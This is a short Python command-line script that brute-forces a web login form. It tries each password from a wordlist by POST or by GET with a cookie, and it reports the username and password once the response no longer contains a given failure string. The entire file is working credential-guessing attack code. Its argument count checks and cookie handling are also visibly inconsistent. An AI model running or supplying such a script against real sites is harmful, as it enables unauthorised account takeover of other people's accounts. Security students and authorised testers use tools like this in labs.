import sys
import requests
from termcolor import colored

def cracking(username, url, password_file, login_failed_string, cookie_value=''):
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print(colored(('Trying: ' + password), 'red'))
            data = {'username': username, 'password': password, 'Login': 'submit'}
            if cookie_value:
                response = requests.get(url, params={'username': username, 'password': password, 'Login': 'Login'},
                                        cookies={'Cookie': cookie_value})
            else:
                response = requests.post(url, data=data)
            if login_failed_string in response.content.decode():
                pass
            else:
                print(colored(('[+] Found Username: ==> ' + username), 'green'))
                print(colored(('[+] Found Password: ==> ' + password), 'green'))
                exit()

if __name__ == "__main__":
    if len(sys.argv) != 6 and len(sys.argv) != 7:
        print("Usage: python bruteforce.py <URL> <Username> <PasswordFile> <LoginFailedString> [<CookieValue>]")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    login_failed_string = sys.argv[4]
    cookie_value = sys.argv[5] if len(sys.argv) == 7 else ''

    cracking(username, url, password_file, login_failed_string, cookie_value)
    print('[!!] Password Not In List')



